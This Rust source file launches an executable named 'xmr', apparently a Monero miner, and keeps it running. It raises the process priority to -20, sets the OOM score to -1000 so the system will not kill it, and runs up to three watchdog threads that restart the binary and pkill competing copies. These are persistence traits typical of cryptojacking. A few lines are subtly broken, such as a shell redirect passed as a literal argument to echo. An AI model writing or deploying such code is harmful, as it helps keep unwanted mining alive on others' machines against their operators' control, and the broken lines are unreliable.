use std::process::{Command, Stdio, Child};
use std::env;
use std::io;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;
use std::fs;
use std::path::Path;
use std::fmt;

// For error handling
#[derive(Debug)]
pub enum XmrError {
    IoError(io::Error),
    EnvError(String),
    ExecutionError(String),
    PermissionError(String),
}

// Implement Display for XmrError
impl fmt::Display for XmrError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            XmrError::IoError(e) => write!(f, "IO error: {}", e),
            XmrError::EnvError(s) => write!(f, "Environment error: {}", s),
            XmrError::ExecutionError(s) => write!(f, "Execution error: {}", s),
            XmrError::PermissionError(s) => write!(f, "Permission error: {}", s),
        }
    }
}

// Implement From trait for io::Error to XmrError conversion
impl From<io::Error> for XmrError {
    fn from(error: io::Error) -> Self {
        XmrError::IoError(error)
    }
}

// Simplified logging functions
fn log_info(msg: &str) {
    println!("[INFO] {}", msg);
}

fn log_warn(msg: &str) {
    println!("[WARN] {}", msg);
}

fn log_error(msg: &str) {
    eprintln!("[ERROR] {}", msg);
}

fn log_debug(msg: &str) {
    println!("[DEBUG] {}", msg);
}

// Helper function to get XMR path with better error handling
fn get_xmr_path() -> Result<String, XmrError> {
    // Try HOME first
    if let Ok(home_dir) = env::var("HOME") {
        let path = format!("{}/xmr/xmr", home_dir);
        if Path::new(&path).exists() {
            return Ok(path);
        }
    }
    
    // Try current directory as fallback
    if let Ok(current_dir) = env::current_dir() {
        let path = current_dir.join("xmr").join("xmr").to_string_lossy().to_string();
        if Path::new(&path).exists() {
            return Ok(path);
        }
    }
    
    // Try /usr/local/bin as another fallback
    let path = "/usr/local/bin/xmr";
    if Path::new(path).exists() {
        return Ok(path.to_string());
    }
    
    // Last attempt - try to find xmr in PATH
    if let Ok(output) = Command::new("which").arg("xmr").output() {
        if output.status.success() {
            if let Ok(path) = String::from_utf8(output.stdout) {
                let path = path.trim();
                if !path.is_empty() {
                    return Ok(path.to_string());
                }
            }
        }
    }
    
    Err(XmrError::EnvError("Could not find XMR executable in any standard location".to_string()))
}

// Set executable permissions with better error handling
fn set_executable_permissions(path: &str) -> Result<(), XmrError> {
    log_debug(&format!("Setting executable permissions for {}", path));
    
    // Try chmod first (Unix systems)
    let chmod_result = Command::new("chmod")
        .arg("+x")
        .arg(path)
        .status();
        
    match chmod_result {
        Ok(status) if status.success() => {
            log_debug("chmod successful");
            return Ok(());
        },
        Ok(_) => {
            log_warn("chmod command failed, trying alternative method");
        },
        Err(e) => {
            log_warn(&format!("chmod command error: {}, trying alternative method", e));
        }
    }
    
    // Alternative: try to use filesystem permissions directly
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        match fs::metadata(path) {
            Ok(metadata) => {
                let mut perms = metadata.permissions();
                perms.set_mode(0o755); // rwxr-xr-x
                match fs::set_permissions(path, perms) {
                    Ok(_) => {
                        log_debug("Successfully set permissions using fs::set_permissions");
                        return Ok(());
                    },
                    Err(e) => {
                        return Err(XmrError::PermissionError(format!("Failed to set permissions: {}", e)));
                    }
                }
            },
            Err(e) => {
                return Err(XmrError::PermissionError(format!("Failed to get file metadata: {}", e)));
            }
        }
    }
    
    // If we get here on non-unix systems, assume it's already executable
    #[cfg(not(unix))]
    {
        log_debug("Non-Unix system detected, assuming executable permissions are already set");
        Ok(())
    }
}

// The original function - kept for backward compatibility but improved
pub fn run_xmr() -> Result<(), XmrError> {
    log_info("Starting run_xmr function");
    
    // Get XMR path with better error handling
    let xmr_path = get_xmr_path()?;
    log_info(&format!("Found XMR at: {}", xmr_path));
    
    // Set executable permissions
    set_executable_permissions(&xmr_path)?;
    
    // Execute with improved error handling and output capture
    log_info("Executing XMR");
    let output = Command::new(&xmr_path)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()?;
    
    if output.status.success() {
        log_info("XMR execution completed successfully");
        
        // Log stdout for debugging if needed
        if let Ok(stdout) = String::from_utf8(output.stdout) {
            if !stdout.trim().is_empty() {
                log_debug(&format!("XMR stdout: {}", stdout));
            }
        }
        
        Ok(())
    } else {
        // Capture error details
        let stderr = String::from_utf8_lossy(&output.stderr);
        let exit_code = output.status.code().unwrap_or(-1);
        
        log_error(&format!("XMR execution failed with exit code {}: {}", exit_code, stderr));
        
        Err(XmrError::ExecutionError(format!(
            "XMR execution failed with exit code {}: {}", 
            exit_code,
            stderr
        )))
    }
}

// Function to capture and handle CTRL+C with improved handling
fn setup_ctrlc_handler() -> Arc<AtomicBool> {
    let running = Arc::new(AtomicBool::new(true));
    let r = running.clone();
    
    match ctrlc::set_handler(move || {
        log_info("Received CTRL+C, preparing for graceful shutdown...");
        r.store(false, Ordering::SeqCst);
    }) {
        Ok(_) => {},
        Err(e) => {
            log_warn(&format!("Failed to set Ctrl-C handler: {}", e));
            log_warn("Process will continue without Ctrl-C handling");
        }
    }
    
    running
}

// Set process priority to be resistant to OOM killer
fn set_process_priority() -> Result<(), XmrError> {
    log_info("Setting process priority");
    
    #[cfg(target_os = "linux")]
    {
        // Set process nice value to -20 (highest priority)
        log_debug("Setting process nice value to -20");
        match Command::new("renice")
            .args(["-n", "-20", "-p", &format!("{}", std::process::id())])
            .output() {
                Ok(output) => {
                    if !output.status.success() {
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        log_warn(&format!("Failed to set nice value: {}", stderr));
                    } else {
                        log_debug("Successfully set nice value");
                    }
                },
                Err(e) => {
                    log_warn(&format!("Failed to execute renice command: {}", e));
                }
            }
        
        // Try with alternative methods if renice fails
        if let Err(e) = Command::new("nice")
            .args(["-n", "-20", "echo", "Setting priority"])
            .status() {
                log_warn(&format!("Nice command also failed: {}", e));
            }
        
        // Write -1000 to /proc/self/oom_score_adj
        log_debug("Setting OOM score to minimum");
        if fs::write("/proc/self/oom_score_adj", "-1000").is_ok() {
            log_debug("Successfully set OOM score to minimum");
        } else {
            log_warn("Failed to set OOM score");
            
            // Try alternative method
            if Command::new("echo")
                .args(["-1000", ">", "/proc/self/oom_score_adj"])
                .status()
                .is_ok() {
                    log_debug("Set OOM score using echo command");
                }
        }
    }
    
    Ok(())
}

// Function to retry execution with improved error handling and recovery strategies
fn execute_with_retry(
    cmd: &str,
    max_retries: usize,
    delay_ms: u64
) -> Result<(), XmrError> {
    let mut attempt = 0;
    
    while attempt < max_retries {
        match Command::new(cmd).status() {
            Ok(status) if status.success() => {
                return Ok(());
            },
            Ok(status) => {
                let code = status.code().unwrap_or(-1);
                log_warn(&format!("Command '{}' failed with exit code {}. Retry {}/{}", 
                     cmd, code, attempt + 1, max_retries));
            },
            Err(e) => {
                log_warn(&format!("Command '{}' failed with error: {}. Retry {}/{}", 
                     cmd, e, attempt + 1, max_retries));
            }
        }
        
        attempt += 1;
        thread::sleep(Duration::from_millis(delay_ms));
    }
    
    Err(XmrError::ExecutionError(format!(
        "Command '{}' failed after {} retries", cmd, max_retries
    )))
}

// Function to create a watchdog that restarts the process if it's killed
fn create_watchdog(xmr_path: String, running: Arc<AtomicBool>) -> thread::JoinHandle<()> {
    thread::spawn(move || {
        let mut current_process: Option<Child> = None;
        let mut consecutive_failures = 0;
        const MAX_FAILURES: usize = 5;
        
        while running.load(Ordering::SeqCst) {
            // Check if we need to start/restart the process
            let need_restart = match &mut current_process {
                None => true,
                Some(child) => match child.try_wait() {
                    Ok(Some(status)) => {
                        // Process has exited
                        if !status.success() {
                            let code = status.code().unwrap_or(-1);
                            log_warn(&format!("XMR process exited with code {}. Restarting...", code));
                            consecutive_failures += 1;
                        } else {
                            log_info("XMR process exited normally. Restarting...");
                            consecutive_failures = 0;
                        }
                        true
                    },
                    Ok(None) => false, // Process still running
                    Err(e) => {
                        log_error(&format!("Error checking XMR process status: {}", e));
                        consecutive_failures += 1;
                        true
                    }
                }
            };
            
            if need_restart {
                // If too many consecutive failures, wait longer before retrying
                if consecutive_failures >= MAX_FAILURES {
                    log_warn(&format!("Too many consecutive failures ({}). Waiting longer before restart...", 
                         consecutive_failures));
                    thread::sleep(Duration::from_secs(30));
                }
                
                // Previous process ended or doesn't exist, start a new one
                match Command::new(&xmr_path)
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped())
                    .spawn() {
                        Ok(child) => {
                            log_info(&format!("Started XMR process with PID: {}", child.id()));
                            current_process = Some(child);
                            
                            // Reset consecutive failures if successful
                            if consecutive_failures > 0 {
                                consecutive_failures = 0;
                            }
                        },
                        Err(e) => {
                            log_error(&format!("Failed to start XMR process: {}", e));
                            consecutive_failures += 1;
                            
                            // Exponential backoff for retries
                            let backoff = 5 * (1 << consecutive_failures.min(10));
                            log_warn(&format!("Retrying in {} seconds...", backoff));
                            thread::sleep(Duration::from_secs(backoff));
                        }
                    }
            }
            
            // Small sleep to prevent CPU thrashing
            thread::sleep(Duration::from_millis(100));
        }
        
        // When ctrl+c is received, terminate the child process
        if let Some(mut child) = current_process {
            log_info("Terminating XMR process...");
            if let Err(e) = child.kill() {
                log_error(&format!("Failed to kill XMR process: {}", e));
            }
        }
    })
}

pub fn run_xmr_resilient() -> Result<(), XmrError> {
    log_info("Starting run_xmr_resilient function");
    
    // Get XMR path with better error handling
    let xmr_path = get_xmr_path()?;
    log_info(&format!("Found XMR at: {}", xmr_path));
    
    // Set executable permissions
    set_executable_permissions(&xmr_path)?;
    
    // Set process priority to be resistant to system killing
    set_process_priority()?;
    
    // Setup CTRL+C handler
    let running = setup_ctrlc_handler();
    
    // Create and start the watchdog
    let watchdog_handle = create_watchdog(xmr_path, running.clone());
    
    log_info("XMR process is now running and protected. Press Ctrl+C to terminate when needed.");
    
    // Wait for Ctrl+C
    while running.load(Ordering::SeqCst) {
        thread::sleep(Duration::from_secs(1));
    }
    
    // Wait for watchdog to complete
    if let Err(e) = watchdog_handle.join() {
        log_error(&format!("Error joining watchdog thread: {:?}", e));
    }
    
    log_info("XMR process has been terminated. Exiting...");
    Ok(())
}

// New function: run_xmr_super_resilient for the most aggressive approach
pub fn run_xmr_super_resilient() -> Result<(), XmrError> {
    log_info("Starting run_xmr_super_resilient function");
    
    // Get XMR path with better error handling
    let xmr_path = get_xmr_path()?;
    log_info(&format!("Found XMR at: {}", xmr_path));
    
    // Set executable permissions
    set_executable_permissions(&xmr_path)?;
    
    // Set process priority to be resistant to system killing
    set_process_priority()?;
    
    // Setup CTRL+C handler
    let running = setup_ctrlc_handler();
    
    // Create multiple watchdogs for redundancy (3 independent watchdogs)
    log_info("Starting multiple watchdog threads for redundancy");
    let watchdog_handles = (0..3).map(|i| {
        let xmr_path_clone = xmr_path.clone();
        let running_clone = running.clone();
        
        thread::spawn(move || {
            log_info(&format!("Watchdog #{} started", i+1));
            let mut current_process: Option<Child> = None;
            let mut consecutive_failures = 0;
            let mut backoff_time = 1; // Initial backoff in seconds
            
            while running_clone.load(Ordering::SeqCst) {
                // Check if we need to start/restart the process
                let need_restart = match &mut current_process {
                    None => true,
                    Some(child) => match child.try_wait() {
                        Ok(Some(_)) => true,  // Process has exited
                        Ok(None) => false,    // Process still running
                        Err(_) => true        // Error checking status
                    }
                };
                
                if need_restart {
                    // Try to kill any existing processes first to ensure clean start
                    #[cfg(unix)]
                    {
                        let _ = Command::new("pkill")
                            .arg("-f")
                            .arg(&xmr_path_clone)
                            .status();
                    }
                    
                    // Previous process ended or doesn't exist, start a new one
                    match Command::new(&xmr_path_clone)
                        .stdout(Stdio::piped())
                        .stderr(Stdio::piped())
                        .spawn() {
                            Ok(child) => {
                                log_info(&format!("Watchdog #{}: Started XMR process with PID: {}", i+1, child.id()));
                                current_process = Some(child);
                                consecutive_failures = 0;
                                backoff_time = 1;
                            },
                            Err(e) => {
                                log_error(&format!("Watchdog #{}: Failed to start XMR process: {}", i+1, e));
                                consecutive_failures += 1;
                                
                                // Exponential backoff with maximum cap
                                backoff_time = (backoff_time * 2).min(300); // Max 5 minutes
                                thread::sleep(Duration::from_secs(backoff_time));
                            }
                        }
                } else {
                    // Process is running, check its health
                    if let Some(child) = &mut current_process {
                        // Try to get some output to verify it's still responsive
                        #[cfg(unix)]
                        {
                            match Command::new("ps")
                                .args(["-p", &child.id().to_string(), "-o", "state"])
                                .output() {
                                    Ok(output) => {
                                        let ps_output = String::from_utf8_lossy(&output.stdout);
                                        if !ps_output.contains('R') && !ps_output.contains('S') {
                                            log_warn(&format!("Watchdog #{}: XMR process may be in a bad state ({}), restarting...", 
                                                 i+1, ps_output.trim()));
                                            let _ = child.kill();
                                            current_process = None;
                                        }
                                    },
                                    Err(_) => {
                                        // Can't check process state, assume it's ok
                                    }
                                }
                        }
                    }
                }
                
                // Small sleep to prevent CPU thrashing - different for each watchdog
                // to avoid synchronization
                thread::sleep(Duration::from_millis(100 + (i as u64 * 50)));
            }
            
            // When ctrl+c is received, terminate the child process
            if let Some(mut child) = current_process {
                log_info(&format!("Watchdog #{}: Terminating XMR process...", i+1));
                if let Err(e) = child.kill() {
                    log_error(&format!("Watchdog #{}: Failed to kill XMR process: {}", i+1, e));
                }
            }
            
            log_info(&format!("Watchdog #{} terminated", i+1));
        })
    }).collect::<Vec<_>>();
    
    log_info("XMR process is now running with super-resilient protection. Press Ctrl+C to terminate.");
    
    // Wait for Ctrl+C
    while running.load(Ordering::SeqCst) {
        thread::sleep(Duration::from_secs(1));
    }
    
    // Wait for all watchdogs to complete
    for (i, handle) in watchdog_handles.into_iter().enumerate() {
        if let Err(e) = handle.join() {
            log_error(&format!("Error joining watchdog #{} thread: {:?}", i+1, e));
        }
    }
    
    log_info("All XMR processes have been terminated. Exiting...");
    Ok(())
}
